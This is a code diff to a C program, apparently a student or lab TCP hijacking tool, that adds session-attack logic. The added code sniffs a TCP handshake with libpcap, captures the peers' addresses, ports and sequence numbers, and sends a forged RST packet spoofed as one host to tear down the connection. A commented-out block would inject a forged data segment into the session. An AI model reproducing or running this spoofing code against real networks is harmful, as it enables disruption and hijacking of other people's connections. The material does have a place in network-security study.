@@ -1,13 +1,24 @@
 #include<stdio.h>
+#include<time.h>
 #include<string.h>
 #include<sys/socket.h>
 #include<stdlib.h>
+#include<unistd.h>
 #include<netinet/in.h>
 #include<arpa/inet.h>
 #include<pcap.h>
 
 #include "header.h"
 #include "TCP_hijack.h"
+
+unsigned long host1, host2;
+unsigned int  port1, port2;
+unsigned char packet1[BUF_SIZE], packet2[BUF_SIZE];
+int size1, size2, dsize1, dsize2;
+struct iphdr  *iphdr1,  *iphdr2;
+struct tcphdr *tcphdr1, *tcphdr2;
+char *data1, *data2;
+time_t time1, time2;
 
 int total = 0;
 
@@ -19,7 +30,6 @@ int main(int argc, char *argv[])
 	char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
 	char *dev_name;
 	bpf_u_int32 net_ip, mask;
-
 
 	//get all available devices
 	if(pcap_findalldevs(&all_dev, err_buf))
@@ -142,8 +152,53 @@ int main(int argc, char *argv[])
 		exit(1);
 	}
 
-	//Put the device in sniff loop
-	pcap_loop(handle , 4 , process_packet , NULL);
+	// Sniff on the three-way handshake packets, set up attack target
+	pcap_loop(handle , 3 , set_up_attack , NULL);
+	
+	// Send a packet to host2 pretending host1
+	tcphdr1->seq = htonl(ntohl(tcphdr1->seq)+1);
+    tcphdr1->syn = 0;
+    tcphdr1->rst = 1;
+    tcphdr1->ack = 0;
+	tcphdr1->check = TCP_checksum(iphdr1, tcphdr1, data1);
+
+	srand(time(NULL));
+	iphdr1->id = ntohs(rand());
+	iphdr1->check = checksum((unsigned short*)iphdr1, 20);
+
+	struct sockaddr_in in_addr;
+	in_addr.sin_family = AF_INET;
+	in_addr.sin_port = tcphdr1->dest;
+	in_addr.sin_addr.s_addr = iphdr1->daddr; 
+	int len = sendto(fd, packet1, size1, 0, (struct sockaddr*)&in_addr, sizeof(struct sockaddr));
+	if(len){
+		printf("sent %d bytes to %s:%d\n", len, inet_ntoa(in_addr.sin_addr), ntohs(tcphdr1->dest));
+	}
+
+	// struct sockaddr_in in_addr;
+	// in_addr.sin_family = AF_INET;
+	// in_addr.sin_port = tcphdr2->dest;
+	// in_addr.sin_addr.s_addr = iphdr2->daddr;
+
+	// char *msg = "TCP_hijack";
+	// tcphdr2->seq = tcphdr1->ack_seq;
+	// printf("ntohl(tcphdr1->TSval) = %d\n", ntohl(tcphdr1->TSval));
+	// tcphdr2->TSecr = tcphdr1->TSval;
+	// tcphdr2->TSval = htonl(ntohl(tcphdr2->TSecr) + time(NULL) - time2);
+	// bzero(data2, dsize2);
+	// memcpy(data2, msg, strlen(msg));
+	// size2 = size2 - dsize2 + strlen(msg);
+	// dsize2 = strlen(msg);
+
+	// iphdr2->tot_len = htons(size2);
+	// srand(time(NULL));
+	// iphdr2->id = htons(ntohs(iphdr2->id)+1);
+	// iphdr2->check = checksum((unsigned short*)iphdr2, sizeof(struct iphdr));
+
+	// int len = sendto(fd, packet2, size2, 0, (struct sockaddr*)&in_addr, sizeof(struct sockaddr));
+	// if(len){
+	// 	printf("sent %d bytes to %s:%d\n", len, inet_ntoa(in_addr.sin_addr), ntohs(tcphdr2->dest));
+	// }
 
 	pcap_close(handle);
 
@@ -153,59 +208,80 @@ int main(int argc, char *argv[])
 
 }
 
-void process_packet(unsigned char *args, const struct pcap_pkthdr *header, const unsigned char *buffer)
+void set_up_attack(unsigned char *args, const struct pcap_pkthdr *header, const unsigned char *buffer)
 {
 	printf("a packet is received! %d \n", ++total);
 	int size = header->len;
 
-	//	print_udp_packet(buffer, size);
-
-//	PrintData(buffer, size);
-
 	//Finding the beginning of IP header
-	struct iphdr *in_iphr;
+	int link_header_size;
 
 	switch (header_type)
 	{
 	case LINKTYPE_ETH:
-		in_iphr = (struct iphdr*)(buffer + sizeof(struct ethhdr)); //For ethernet
-		size -= sizeof(struct ethhdr);
+		link_header_size =  sizeof(struct ethhdr); //For ethernet
 		break;
 
 	case LINKTYPE_NULL:
-		in_iphr = (struct iphdr*)(buffer + 4);
-		size -= 4;
+		link_header_size = 4;
 		break;
 
 	case LINKTYPE_WIFI:
-		in_iphr = (struct iphdr*)(buffer + 57);
-		size -= 57;
+		link_header_size = 57;
 		break;
 
 	case 113:
-		in_iphr = (struct iphdr*)(buffer + 16);
-		size -= 16;
+		link_header_size = 16;
 		break;
 
 	default:
 		fprintf(stderr, "Unknown header type %d\n", header_type);
 		exit(1);
 	}
+	size -= link_header_size;
 
-	//the TCP header
-	struct tcphdr *in_tcphdr = (struct tcphdr*)((unsigned char*)(in_iphr) + 20);
+	if(total == 2){
+		// The second packet is assumed from host1 to host2
+		time1 = header->ts.tv_sec;
+		puts("*****catched message from host1*****");
+		memcpy(packet1, buffer+link_header_size, size);
 
-	print_information(in_iphr, in_tcphdr);
+		iphdr1 = (struct iphdr*)(packet1);
+		tcphdr1 = (struct tcphdr*)(iphdr1 + 1);
+
+		host1 = iphdr1->saddr;
+		host2 = iphdr1->daddr;
+		port1 = tcphdr1->source;
+		port2 = tcphdr1->dest;
+		
+		data1 = (char *)(tcphdr1)+tcphdr1->doff*4;
+		size1 = size;
+		dsize1 = size - 20 - tcphdr1->doff*4;
+
+		print_information(iphdr1, tcphdr1);
+	}
+	if(total == 3){
+		// The third packet is assumed from host2 to host1
+		time2 = header->ts.tv_sec;
+		puts("*****catched message from host2*****");
+		
+		memcpy(packet2, buffer+link_header_size, size);
+
+		iphdr2 = (struct iphdr*)(packet2);
+		tcphdr2 = (struct tcphdr*)(iphdr2 + 1);
+
+		if(iphdr2->saddr!=host2 || iphdr2->daddr!=host1 || tcphdr2->source!=port2 || tcphdr2->dest!=port1){
+			puts("failed to catch ACK from host2");
+			return;
+		}
+		
+		size2 = size;
+		dsize2 = size - 20 - tcphdr2->doff*4;
+		data2 = (char *)(tcphdr2)+tcphdr2->doff*4;
+		
+		print_information(iphdr2, tcphdr2);
+	}
 	
-	unsigned char send_buf[BUF_SIZE];
-	struct sockaddr_in addr;
-	addr.sin_family = AF_INET;
-	addr.sin_port = ntohs(in_tcphdr->source);
-	addr.sin_addr.s_addr = in_iphr->saddr; 
-
-	int data_size = build_packet(send_buf, in_iphr, in_tcphdr);
-
-	sendto(fd, send_buf, data_size, 0, (struct sockaddr*)&addr, sizeof(struct sockaddr_in));
 }
 
 void print_information(struct iphdr* iph, struct tcphdr* tcph){
@@ -224,59 +300,4 @@ void print_information(struct iphdr* iph, struct tcphdr* tcph){
 	printf("Message: %s\n", (char *)(tcph)+tcph->doff*4);
 
     puts("-----------------------\n");
-}
-
-int build_packet(unsigned char *buffer, struct iphdr *in_iphdr, struct tcphdr *in_tcphdr){
-	char *test_string = TEST_STRING;
-	
-	struct iphdr *iph = (struct iphdr*)buffer;
-	iph->version = 4;
-	iph->ihl = 5;
-	iph->tos = 0;
-	iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(test_string));
-	iph->id = htons(112);
-	iph->frag_off = 0;
-	iph->ttl = 255;
-	iph->protocol =IPPROTO_TCP;
-	iph->check = checksum((unsigned short*)iph, sizeof(struct iphdr));
-	iph->saddr = in_iphdr->daddr;
-	iph->daddr = in_iphdr->saddr;
-
-	struct tcphdr *tcph = (struct tcphdr*)(buffer+sizeof(struct iphdr));
-    //the TCP header
-    tcph->source = in_tcphdr->dest;
-	tcph->dest = in_tcphdr->source;
-	tcph->seq = in_tcphdr->ack;
-	tcph->ack_seq = in_tcphdr->seq + (ntohs(in_iphdr->tot_len - sizeof(struct iphdr) - sizeof(struct tcphdr)));
-	tcph->res1 = 0;
-    tcph->doff = 5;
-    tcph->fin = 0;
-    tcph->syn = 0;
-    tcph->rst = 1;
-    tcph->psh = 0;
-    tcph->ack = 0;
-    tcph->urg = 0;
-    tcph->res2 = 0;
-	tcph->window = htons(65535);
-    tcph->check = 0;
-    tcph->urg_ptr = 0;
-	//TCP checksum
-		struct pseudo_header psh;
-		bzero(&psh, sizeof(struct pseudo_header));
-		psh.source_address = in_iphdr->daddr;
-		psh.dest_address = in_iphdr->saddr;
-		psh.placeholder = 0;
-		psh.protocol = IPPROTO_TCP;
-		psh.length = htons(sizeof(struct tcphdr));
-
-		char *temp;
-		temp = malloc(sizeof(struct pseudo_header) + sizeof(struct tcphdr));
-		memcpy(temp, &psh, sizeof(struct pseudo_header));
-		memcpy(temp+sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
-	tcph->check = checksum((unsigned short*)temp, sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(test_string));
-
-	// payload
-	memcpy(buffer+40, test_string, strlen(test_string));
-
-	return ntohs(iph->tot_len);
 }
